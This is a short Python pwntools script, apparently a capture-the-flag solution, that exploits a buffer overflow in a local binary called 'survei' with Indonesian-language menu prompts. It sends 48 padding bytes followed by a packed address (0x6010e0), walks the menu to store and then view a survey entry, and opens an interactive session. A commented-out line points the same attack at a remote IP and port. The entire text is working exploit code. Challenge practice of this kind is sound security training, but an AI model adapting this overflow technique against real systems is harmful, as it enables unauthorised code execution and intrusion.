from pwn import *
from struct import *

payload = b'A'*48 + pack('I', 0x6010e0)

p = process("./survei")
#p = remote("103.185.38.238", 17835)
p.recvline()
p.sendline(b'1')
p.recvuntil(b'disimpan?:')
p.sendline(b'0')
p.recvuntil(b'Isi survei:')
p.sendline(payload)
p.recvuntil(b'>')
p.sendline(b'2')
p.recvuntil(b'dilihat:')
p.sendline(b'0')
p.interactive()
